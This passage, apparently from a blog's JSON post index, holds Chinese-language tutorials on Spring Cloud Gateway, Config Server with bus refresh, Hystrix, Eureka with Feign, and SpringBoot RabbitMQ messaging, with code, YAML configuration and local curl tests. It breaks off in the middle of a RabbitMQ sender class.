hello, huskyui Mon Apr 13 18:13:54 CST 2020自定义Predicate// 我们先去看一下cookie判断的源码 CookieRoutePredicateFactory.java @Override public Predicate&lt;ServerWebExchange&gt; apply(Config config) { return new GatewayPredicate() { @Override public boolean test(ServerWebExchange exchange) { List&lt;HttpCookie&gt; cookies = exchange.getRequest().getCookies() .get(config.name); if (cookies == null) { return false; } for (HttpCookie cookie : cookies) { if (cookie.getValue().matches(config.regexp)) { return true; } } return false; } @Override public String toString() { return String.format(&quot;Cookie: name=%s regexp=%s&quot;, config.name, config.regexp); } }; } // 很好理解的代码，我们写一串header判断的 @Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder) { return builder.routes() .route(r -&gt; r.predicate(t -&gt; { List&lt;String&gt; values= t.getRequest().getHeaders().get(&quot;token&quot;); if(values==null || values.isEmpty()){ return false; } return values.stream().anyMatch(value-&gt;value.equals(&quot;123456&quot;)); }) .uri(&quot;lb://eureka-consumer&quot;).id(&quot;first&quot;) ).build(); } D:\\gitclonepackage\\cloud&gt;curl -X POST http://localhost:10000/hello/huskyui --header &quot;token: 123456&quot; hello, huskyui Thu Apr 16 14:58:20 CST 2020介绍filterRoute filters allow the modification of the incoming HTTP request or outgoingHTTP response in some manner. Route filters are scoped to a particular route.Spring Cloud Gateway includes many built-in GatewayFilter Factories. 路由过滤器可以修改HTTP请求和HTTP响应，路由过滤器的作用域是特定的路由。spring cloud gateway有很多内置的网关过滤器的工厂。 使用PathRoutePredicateFactory和StripPrefixGatewayFilterFactory实现对特定项目访问 @Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder) { return builder.routes() .route(r -&gt; r.path(&quot;/consumer/**&quot;) .filters(f-&gt;f.stripPrefix(1)) .uri(&quot;lb://eureka-consumer&quot;).id(&quot;first&quot;) ).build(); } D:\\gitclonepackage\\cloud&gt;curl -X POST http://localhost:10000/consumer/hello/huskyui hello, huskyui Thu Apr 16 15:16:31 CST 2020 // 在访问的时候，由于stripPrefix是1，会去除/consumer这一层，真正的会转发成 // lb://eureka-consumer/hello/huskyui修改RequestBody中信息 @Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder) { return builder.routes() .route(r -&gt; r.path(&quot;/producer/**&quot;) .filters(f -&gt; f.stripPrefix(1) .modifyRequestBody(Map.class, Map.class, MediaType.APPLICATION_JSON_VALUE, (serverWebExchange, s) -&gt; { System.out.println(s); s.put(&quot;name&quot;,&quot;adios&quot;); return Mono.just(s); })) .uri(&quot;lb://eureka-producer&quot;).id(&quot;first&quot;) ).build(); } // 可以看到这个s的类型是Map.class,我修改的对应name的值， POST http://localhost:10000/producer/hello Content-Type: application/json { &quot;name&quot;: &quot;huskyui&quot; } hello, adios Thu Apr 16 18:34:56 CST 2020 // 可以看到我修改对应的requestBody的值，在控制台也打印了初始RequestBody请求json（上面请求方式是通过idea里面内置的请求方式）全局拦截器The GlobalFilter interface has the same signature as GatewayFilter .These are special filters that are conditionally applied to all routes. GlobalFilter接口具有与gatewayFilter相同的签名，这些是特殊过滤器，有条件地应用于所有路由。 后续从现在开始，暂停更新spring cloud gateway相关博客，我先去学点别的了。学习这种并没有什么用。 参考 纯洁的微笑写的spring cloud文档 windmt写的文档 [ spring cloud gateway官方文档 ](https://cloud.spring.io/spring-cloud-static/spring-cloud-gateway/2.2.2.RELEASE/reference/html/#gateway-starter) [ github上spring cloud gateway提供的samples ](https://github.com/spring-cloud/spring-cloud-gateway/tree/master/spring-cloud-gateway-sample/src/main/java/org/springframework/cloud/gateway/sample)","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"},{"name":"spring cloud","slug":"spring-cloud","permalink":"http://yoursite.com/tags/spring-cloud/"}]},{"title":"SpringCloud-config","slug":"SpringCloud-config","date":"2020-03-30T07:59:08.000Z","updated":"2020-11-14T17:10:42.020Z","comments":true,"path":"2020/03/30/SpringCloud-config/","link":"","permalink":"http://yoursite.com/2020/03/30/SpringCloud-config/","excerpt":"","text":"Spring Cloud Config简介Spring Cloud Config provides server-side and client-side support forexternalized configuration in a distributed system. With the Config Server,you have a central place to manage external properties for applications acrossall environments. The concepts on both client and server map identically tothe Spring Environment and PropertySource abstractions, so they fitvery well with Spring applications but can be used with any applicationrunning in any language. As an application moves through the deploymentpipeline from dev to test and into production, you can manage theconfiguration between those environments and be certain that applications haveeverything they need to run when they migrate. The default implementation ofthe server storage backend uses git, so it easily supports labelled versionsof configuration environments as well as being accessible to a wide range oftooling for managing the content. It is easy to add alternativeimplementations and plug them in with Spring configuration. Spring Cloud Config为分布式系统中的外部化配置提供了服务器端和客户端支持。有了ConfigServer，您就有了一个中心位置来管理跨所有环境的应用程序的外部属性。客户机和服务器上的概念与Spring环境和PropertySource抽象完全相同，因此它们非常适合Spring应用程序，但可以用于以任何语言运行的任何应用程序.当应用程序通过部署管道从dev转移到测试并进入生产环境时，您可以在两者之间管理配置.服务器存储后端默认的实现使用git，因此它很容易支持配置环境的标记版本，并且可以访问各种各样的工具来管理内容。很容易添加替代实现并将它们插入Spring配置中 config-server创建一个配置仓库 具体样式，可以看https://github.com/huskyui/config-repo 在 spring-cloud 下面有三个文件， config-dev.yml 和 config-prod.yml 和 config-test.yml 导入pom &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--spring-cloud.version Hoxton.SR3 --&gt;application.yml spring: application: name: config-server cloud: config: server: git: uri: https://github.com/huskyui/config-repo # uri search-paths: spring-cloud # 层级 server: port: 12000 eureka: client: service-url: defaultZone: http://localhost:7000/eureka/ # 今天写defalutZone写错了，发现应用在请求loclahost:8761/eureka/,原来默认值是这个@EnableConfigServer @SpringBootApplication @EnableConfigServer // 开启config-server public class CloudConfigServerApplication { public static void main(String[] args) { SpringApplication.run(CloudConfigServerApplication.class, args); } }测试 curl http://localhost:12000/config-dev.yml currency: name: huskyui-update-2020-03-24-----2config-clientpom &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--spring-cloud-version Hoxton.SR3--&gt;bootstrap.yml bootstrap.yml优先于application.yml配置 spring: cloud: config: label: master # 用于拉取远程配置属性的标签名称，在基于git的服务器，通常是master name: config # Name of application used to fetch remote properties. 对应config-dev.yml中的config profile: dev # The default profile to use when fetching remote configuration discovery: enabled: true #Flag to indicate that config server discovery is enabled service-id: config-server #Service id to locate config server.也就是config-server注册在eureka中的application-name eureka: client: service-url: defaultZone: http://localhost:7000/eureka/application.yml spring: application: name: config-git server: port: 13000 management: endpoints: web: exposure: include: refresh # 放开/actuator/refresh路径，具体是什么样式的请求，还得看文档HelloController @RestController /** * Convenience annotation to put a &lt;code&gt;@Bean&lt;/code&gt; definition in * {@link org.springframework.cloud.context.scope.refresh.RefreshScope refresh scope}. * Beans annotated this way can be refreshed at runtime and any components that are using * them will get a new instance on the next method call, fully initialized and injected * with all dependencies. 在调用/actuator/refresh时，运行期间，这个bean会被刷新 */ @RefreshScope public class HelloController { @Value(&quot;${currency.name:error}&quot;) private String name; @RequestMapping(&quot;/hello&quot;) public String name(){ return name; } }测试 1.测试单个应用刷新 打包运行 测试当前数据问题 curl localhost:13000/hello huskyui-update-2020-03-24-----2 更新数据 更新数据config-dev里面的数据 currency: name: huskyui-update-2020-03-27 并提交到远程仓库 调用刷新接口 curl -X POST localhost:13000/actuator/refresh [&quot;currency.name&quot;,&quot;config.client.version&quot;] curl localhost:13000/hello huskyui-update-2020-03-27 可以看到数据刷新成功 2.测试多个应用刷新 java -jar xxx.jar --server.port=13000 java -jar xxx.jar --server.port=13001 curl localhost:13000/hello huskyui-update-2020-03-27 curl localhost:13001/hello huskyui-update-2020-03-27 更新数据config-dev.yml currency: name: huskyui-update-2020-03-27-for-two-client-test2 并提交到远程仓库 curl localhost:13000/hello huskyui-update-2020-03-27 curl localhost:13001/hello huskyui-update-2020-03-27 下面执行刷新操作 curl -X POST localhost:13000/actuator/refresh [&quot;currency.name&quot;,&quot;config.client.version&quot;] curl localhost:12000/config-dev.yml currency: name: huskyui-update-2020-03-27-for-two-client-test2 curl localhost:13000/hello huskyui-update-2020-03-27-for-two-client-test2 curl localhost:13001/hello huskyui-update-2020-03-27 curl -X POST localhost:13001/actuator/refresh [&quot;currency.name&quot;,&quot;config.client.version&quot;] curl -X POST localhost:13001/hello huskyui-update-2020-03-27-for-two-client-test2 可以看到，如果配置文件更新时，/actuator/refresh只是针对单个应用的，如果需要更新所有应用需要分别是去刷新对应的应用使用spring-cloud-bus实现群体刷新 [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-jeIW5krD-1585555116625)(https://s1.ax1x.com/2020/03/30/GmFm2n.jpg)] 从上面的架构图，我们 config-server 和 config-client 都订阅一下RabbitMQ 我们需要修改原来的 config-server POM &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-bus&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-stream-binder-rabbit&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt;application.yml添加 spring: rabbitmq: host: localhost port: 5672 username: guest password: guest ## 上述是RabbitMQ相关连接参数，漏了一个vhost management: endpoints: web: exposure: include: &quot;*&quot; ## 放开/actuator/bus-refreshconfig-client 修改部分也和上述一样 修改后，启动config-server,并启动两台config-client,端口不同（–server.port=different_port） 我们访问 http://localhost:15672/ 访问RabbitMQ客户端，点击exchange,可以看到是 springCloudBus ,是topic类型,三个绑定该exchange的queue的routing key都是#，也就是不处理fanout 测试 首先修改config-repo,并提交 首先查看数据 D:\\gitclonepackage\\cloud&gt;curl localhost:13000/hello huskyui-update-2020-03-30 D:\\gitclonepackage\\cloud&gt;curl localhost:13001/hello huskyui-update-2020-03-30 调用刷新操作 curl -X POST localhost:12000/actuator/bus-refresh 这个请求的时候，是请求config-server;当然也可以请求config-client的bus-refresh D:\\gitclonepackage\\cloud&gt;curl localhost:13001/hello huskyui-update-2020-03-30-last-commit D:\\gitclonepackage\\cloud&gt;curl localhost:13000/hello huskyui-update-2020-03-30-last-commit本篇文章参考： [ Spring Cloud（七）：配置中心（Git 版与动态刷新） ](https://windmt.com/2018/04/19/spring-cloud-7-config-sample/)[ Spring Cloud（八）：配置中心（服务化与高可用） ](https://windmt.com/2018/04/19/spring-cloud-8-config-with-eureka/) Spring Cloud（九）：配置中心（消息总线）【Finchley 版】","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"},{"name":"spring cloud","slug":"spring-cloud","permalink":"http://yoursite.com/tags/spring-cloud/"}]},{"title":"SpringCloud-Hystrix","slug":"SpringCloud-Hystrix","date":"2020-03-24T08:22:18.000Z","updated":"2020-11-14T17:10:42.609Z","comments":true,"path":"2020/03/24/SpringCloud-Hystrix/","link":"","permalink":"http://yoursite.com/2020/03/24/SpringCloud-Hystrix/","excerpt":"","text":"HystrixHystrix is a latency and fault tolerance library designed to isolate points ofaccess to remote systems, services and 3rd party libraries, stop cascadingfailure and enable resilience in complex distributed systems where failure isinevitable. Hystrix是一个延迟和容错库，旨在隔离远程系统、服务和第三方库的访问点，停止次级故障，并且不可避免的复杂分布式系统中实现自我恢复能力。 配置hystrixpom &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.67&lt;/version&gt; &lt;/dependency&gt; &lt;!--web--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--Eureka client --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- Hystrix --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- 声明性REST客户端，使用注解修饰接口，动态实现 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--为了后续放开hystrix.stream路径--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt;application.yml spring: application: name: eureka-consumer-feign-hystrix # 当前应用名称 eureka: client: service-url: defaultZone: http://localhost:7000/eureka/ # 映射到Eureka server的路径 server: port: 9001 feign: hystrix: enabled: true # an OpenFeign client will be wrapped with a Hystrix circuit breaker # 一个OpenFeign客户端将包装有Hystrix断路器 management: endpoints: web: exposure: include: hystrix.stream # 为了给Hystrix Dashboard提供使用启动类配置 @EnableFeignClients //扫描包下被@FeignClient注解的，需要和@Configuration同时使用 @EnableHystrix //开启断路器，并且自动配置找到Hystrix类（if they are available） @SpringBootApplication public class CloudConsumerFeignHystrixApplication { public static void main(String[] args) { SpringApplication.run(CloudConsumerFeignHystrixApplication.class, args); } }远程调用 @Component // name： the service id with optional protocol prefix.带有可选协议前缀的服务ID // fallback： 指定的Feign客户端接口的后备类。fallback类必须实现该接口并且是一个有效的spring bean //Fallback class for the specified Feign client interface. The fallback class must // implement the interface annotated by this annotation and be a valid spring bean. @FeignClient(name = &quot;eureka-producer&quot;,fallback = HelloRemoteHystrix.class) public interface HelloRemote { @RequestMapping(&quot;/hello&quot;) String hello(@RequestBody JSONObject requestJSON); }fallback类 @Component public class HelloRemoteHystrix implements HelloRemote { @Override public String hello(JSONObject requestJSON) { return &quot;hello world&quot;; } }controller @RestController public class HelloController { @Resource private HelloRemote helloRemote; @RequestMapping(&quot;/hello/{name}&quot;) public String hello(@PathVariable(name = &quot;name&quot;)String name){ JSONObject requestJSON = new JSONObject(); requestJSON.put(&quot;name&quot;,name); return helloRemote.hello(requestJSON); } }测试 将eureka-server，producer，feign-hystrix三个项目启动，在eureka-server上可以看到producer和feign-hystrix都已经注册成功。 访问：localhost:9001/hello/huskyui hello, huskyui Tue Mar 24 14:34:44 CST 2020 将producer关闭 访问：localhost:9001/hello/huskyui hello world 再次将producer启动 hello, huskyui Tue Mar 24 14:40:27 CST 2020 这边，可以看到熔断能力，以及自我恢复能力配置一个Hystrix dashboardpom &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix-dashboard&lt;/artifactId&gt; &lt;/dependency&gt;application.yml spring: application: name: hystrix-dashboard server: port: 11000添加注解@EnableHystrixDashboard @SpringBootApplication @EnableHystrixDashboard public class CloudHystrixDashboardApplication { public static void main(String[] args) { SpringApplication.run(CloudHystrixDashboardApplication.class, args); } }测试 运行该项目 访问： http://localhost:11000/hystrix 在启动后输入http://localhost:9001/actuator/hystrix.stream 9001是feign-hystrix的项目的端口，当时我们引入了actuator，开放hystrix.stream 可以看到dashboard相关","categories":[],"tags":[]},{"title":"SpringCloud-Eureka","slug":"SpringCloud-Eureka","date":"2020-03-20T08:53:22.000Z","updated":"2020-11-14T17:10:43.145Z","comments":true,"path":"2020/03/20/SpringCloud-Eureka/","link":"","permalink":"http://yoursite.com/2020/03/20/SpringCloud-Eureka/","excerpt":"","text":"categories: springcloudEureka简介Eureka是一种基于REST(Representational StateThransfer表现层状态转移)的服务，主要用于AWS的定位服务，以便实现中间层服务器的负载均衡和故障转移。 单个注册中心整合pom配置&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;application.ymlspring: application: name: eureka-server server: port: 7000 # Server HTTP port. eureka: instance: hostname: localhost # eureka实例的hostname client: register-with-eureka: false # 指示当前实例是否应在eureka服务器上注册其信息以供发现 fetch-registry: false # 指示当前实例是否从eureka服务器获取注册表信息 service-url: # 映射map。映射关于eureka服务器的url列表，map的value值可以是单个url，也可以是以,分割符分割的多个url，修改之后生效时间将在下一个循环中，由eurekaServiceUrlPollIntervalSeconds指定 defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/注解@EnableEurekaServer@EnableEurekaServer // Annotation to activate Eureka Server related configuration. 激活eureka相关配置的注解 @SpringBootApplication public class EurekaServerApplication { public static void main(String[] args) { SpringApplication.run(EurekaServerApplication.class, args); } }打包部署运行mvn clean package -Dmaven.test.skip=true java -jar xxx.jar 访问 localhost:7000注册两个注册中心修改application.yaml配置文件## 新增两个配置文件 ## application-peer1.yml spring: application: name: eureka-server server: port: 7001 # Server HTTP port. eureka: instance: hostname: localhost # eureka实例的hostname client: register-with-eureka: true # 指示当前实例是否应在eureka服务器上注册其信息以供发现 fetch-registry: true # 指示当前实例是否从eureka服务器获取注册表信息 service-url: # 映射map。映射关于eureka服务器的url列表，map的value值可以是单个url，也可以是以,分割符分割的多个url，修改之后生效时间将在下一个循环中，由eurekaServiceUrlPollIntervalSeconds指定 defaultZone: http://127.0.0.1:7002/eureka/ ## application-peer2.yml spring: application: name: eureka-server server: port: 7002 # Server HTTP port. eureka: instance: hostname: localhost # eureka实例的hostname client: register-with-eureka: true # 指示当前实例是否应在eureka服务器上注册其信息以供发现 fetch-registry: true # 指示当前实例是否从eureka服务器获取注册表信息 service-url: # 映射map。映射关于eureka服务器的url列表，map的value值可以是单个url，也可以是以,分割符分割的多个url，修改之后生效时间将在下一个循环中，由eurekaServiceUrlPollIntervalSeconds指定 defaultZone: http://127.0.0.1:7001/eureka/打包部署// 打包 mvn clean package -Dmaven.test.skip=true // 运行 java -jar xxx.jar --spring.profiles.active=peer1 java -jar xxx.jpg --spring.profiles.active=peer2 // 访问 localhost:7001 localhost:7002服务提供和调用生成者pom&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.67&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;application.ymlspring: application: name: eureka-producer eureka: client: service-url: defaultZone: http://127.0.0.1:7000/eureka/ server: port: 8000具体方法@RestController public class HelloController { @RequestMapping(&quot;/hello&quot;) public String hello(@RequestBody JSONObject requestJSON) { String name = requestJSON.getString(&quot;name&quot;); return &quot;hello, &quot; + name + &quot; &quot; + new Date(); } }打包部署测试mvn clean package -Dmaven.test.skip=true java -jar xxx.jar curl -H&apos;Content-Type: application/json&apos; -d&apos;{&quot;name&quot;:&quot;huskyui&quot;}&apos; localhost:8000/hello hello, huskyui Fri Mar 20 16:06:40 CST 2020消费者pom&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.67&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt;application.ymlspring: application: name: eureka-consumer eureka: client: service-url: defaultZone: http://localhost:7000/eureka/ server: port: 9000添加@EnableFeignClients@EnableFeignClients @SpringBootApplication public class CloudEurekaConsumerApplication { public static void main(String[] args) { SpringApplication.run(CloudEurekaConsumerApplication.class, args); } }具体代码@FeignClient(name = &quot;eureka-producer&quot;) public interface HelloRemote { @RequestMapping(&quot;/hello&quot;) String hello(@RequestBody JSONObject requestJSON); } @RestController public class HelloController { @Autowired private HelloRemote helloRemote; @RequestMapping(&quot;/hello/{name}&quot;) public String index(@PathVariable(&quot;name&quot;)String name){ JSONObject requestJSon = new JSONObject(); requestJSon.put(&quot;name&quot;,name); return helloRemote.hello(requestJSon); } }打包部署测试mvn clean package -Dmaven.test.skip=true java -jar xxx.jar curl localhost:9000/hello/huskyui hello, huskyui Fri Mar 20 16:11:59 CST 2020负载均衡启动两个不同端口的生产者，启动一个消费者会实现相关效果","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"},{"name":"spring cloud","slug":"spring-cloud","permalink":"http://yoursite.com/tags/spring-cloud/"}]},{"title":"SpringBoot整合RabbitMQ","slug":"SpringBoot整合RabbitMQ","date":"2020-03-19T06:14:26.000Z","updated":"2020-11-14T17:10:43.827Z","comments":true,"path":"2020/03/19/SpringBoot整合RabbitMQ/","link":"","permalink":"http://yoursite.com/2020/03/19/SpringBoot%E6%95%B4%E5%90%88RabbitMQ/","excerpt":"","text":"SpringBoot配置RabbitMQ配置maven&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-amqp&lt;/artifactId&gt; &lt;/dependency&gt;配置文件application.ymlspring: rabbitmq: username: user_mmr #用户名 password: 123 #密码 host: localhost # 你要连接的RabbitMQ的host port: 5672 # Rabbit的port virtual-host: &apos;/vhost_mmr&apos; #virtual-hostRabbitMQ教程以下教程都可以在RabbitMQ在github的仓库 rabbitmq-tutorial 中找到，具体springboot在 spring- amqp 模块中。在这里面要讲一下如何运行相关代码 ### 打包项目 mvn clean package ### 运行项目 java -jar xxx.jar --spring.profiles.active=tut1,sender ### 下面放上相关运行命令 System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=hello-world,receiver&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=hello-world,sender&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=work-queues,receiver&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=work-queues,sender&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=pub-sub,receiver&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=pub-sub,sender&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=routing,receiver&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=routing,sender&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=topics,receiver&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=topics,sender&quot;); #### 注意，该项目使用了定时任务 你需要配置允许定时调度的注解 @EnableSchedulinghelloworld@Profile({&quot;tut1&quot;,&quot;hello-world&quot;}) @Configuration public class Tut1Config { @Bean public Queue hello(){ return new Queue(&quot;hello&quot;); } @Profile(&quot;receiver&quot;) @Bean public Tut1Receiver receiver(){ return new Tut1Receiver(); } @Profile(&quot;sender&quot;) @Bean public Tut1Sender sender(){ return new Tut1Sender(); } } // 监听hello队列 Annotation that marks a method to be the target of a Rabbit message listener on the // specified queues()或者bindings(). @RabbitListener(queues = &quot;hello&quot;) public class Tut1Receiver { private static final Logger logger = LoggerFactory.getLogger(Tut1Receiver.class); // Annotation that marks a method to be the target of a Rabbit message // listener within a class that is annotated with {@link RabbitListener} @RabbitHandler public void receive(String in) { logger.info(&quot;[x] Received:{} &quot;, in); System.out.println(&quot;[x] Received:{} &quot;+ in); } } public class Tut1Sender { private final static Logger logger = LoggerFactory.getLogger(Tut1Sender.class); @Autowired private RabbitTemplate rabbitTemplate; @Autowired private Queue queue; @Scheduled(fixedDelay = 1000, initialDelay = 500) public void send() { String msg = &quot;hello world&quot;; this.rabbitTemplate.convertAndSend(queue.getName(), msg); logger.info(&quot;[x] sent :&quot; + msg); System.out.println(&quot;[x] sent :&quot; + msg); } } // java -jar xxx.jar --spring.profiles.active=hello-world,receiver // java -jar xxx.jar --spring.profiles.active=hello-world,senderwork-queues@RabbitListener(queues = &quot;tut.hello&quot;) public class Tut2Receiver { private final static Logger logger = LoggerFactory.getLogger(Tut2Receiver.class); private final int instance; public Tut2Receiver(int i){ this.instance = i; } @RabbitHandler public void receive(String in) throws InterruptedException{ StopWatch watch = new StopWatch(); watch.start(); logger.info(&quot;instance &quot; + this.instance+&quot;[x] recived&quot; + in); doWork(in); watch.stop(); logger.info(&quot;instance &quot; + this.instance +&quot;[x] done&quot;); } private void doWork(String in) throws InterruptedException{ for (char ch:in.toCharArray()){ if(ch == &apos;.&apos;){ TimeUnit.SECONDS.sleep(1); } } } } public class Tut2Sender { private static Logger logger = LoggerFactory.getLogger(Tut2Sender.class); @Autowired private RabbitTemplate rabbitTemplate; @Autowired private Queue queue; AtomicInteger dots = new AtomicInteger(0); AtomicInteger count = new AtomicInteger(0); @Scheduled(fixedDelay = 1000,initialDelay = 500) public void send(){ StringBuilder builder = new StringBuilder(&quot;hello&quot;); if(dots.getAndIncrement() == 3){ dots.set(1); } for(int i = 0;i&lt;dots.get();i++){ builder.append(&quot;.&quot;); } builder.append(count.incrementAndGet()); String msg = builder.toString(); rabbitTemplate.convertAndSend(queue.getName(),msg); logger.info(&quot;[x] sent {}&quot;,msg); } } @Profile({&quot;tut2&quot;,&quot;work-queues&quot;}) @Configuration public class Tut2Config { @Bean public Queue hello(){ return new Queue(&quot;tut.hello&quot;); } @Profile(&quot;receiver&quot;) private static class ReceiverConfig{ @Bean public Tut2Receiver receiver1(){ return new Tut2Receiver(1); } @Bean public Tut2Receiver receiver2(){ return new Tut2Receiver(2); } } @Profile(&quot;sender&quot;) @Bean public Tut2Sender sender(){ return new Tut2Sender(); } }pub-sub@Configuration @Profile({&quot;tut3&quot;,&quot;pub-sub&quot;,&quot;publish-subscribe&quot;}) public class Tut3Config { @Bean public FanoutExchange fanout(){ return new FanoutExchange(&quot;tut.fanout&quot;); } @Profile(&quot;receiver&quot;) private static class ReceiverConfig{ @Bean public Queue autoDeleteQueue1(){ return new AnonymousQueue(); } @Bean public Queue autoDeleteQueue2(){ return new AnonymousQueue(); } // 这个地方可能注册不成功 @Bean public Binding binding1(FanoutExchange fanout,Queue autoDeleteQueue1){ return BindingBuilder.bind(autoDeleteQueue1).to(fanout); } @Bean public Binding binding2(FanoutExchange fanout,Queue autoDeleteQueue2){ return BindingBuilder.bind(autoDeleteQueue2).to(fanout); } @Bean public Tut3Receiver receiver(){ return new Tut3Receiver(); } } @Profile(&quot;sender&quot;) @Bean public Tut3Sender sender(){ return new Tut3Sender(); } } public class Tut3Receiver { @RabbitListener(queues = &quot;#{autoDeleteQueue1.name}&quot;) public void receive1(String in) throws InterruptedException{ receive(in,1); } @RabbitListener(queues = &quot;#{autoDeleteQueue2.name}&quot;) public void receive2(String in) throws InterruptedException{ receive(in,2); } public void receive(String in,int receiver) throws InterruptedException{ StopWatch watch = new StopWatch(); watch.start(); System.out.println(&quot;instance &quot; + receiver + &quot;[x] Received&quot; + in); doWork(in); watch.stop(); System.out.println(&quot;instance&quot; + receiver + &quot;[x] Done in&quot; + watch.getTotalTimeSeconds()+&quot;s&quot;); } private void doWork(String in) throws InterruptedException{ for(char ch: in.toCharArray()){ if(ch == &apos;.&apos;){ TimeUnit.SECONDS.sleep(1); } } } } public class Tut3Sender { @Autowired private RabbitTemplate rabbitTemplate; @Autowired private FanoutExchange fanout; AtomicInteger dots = new AtomicInteger(0); AtomicInteger count = new AtomicInteger(0); @Scheduled(fixedDelay = 1000,initialDelay = 500) public void send(){ StringBuilder builder = new StringBuilder(&quot;hello&quot;); if(dots.getAndIncrement() == 3){ dots.set(1); } for(int i = 0;i &lt; dots.get();i++){ builder.append(&quot;.&quot;); } 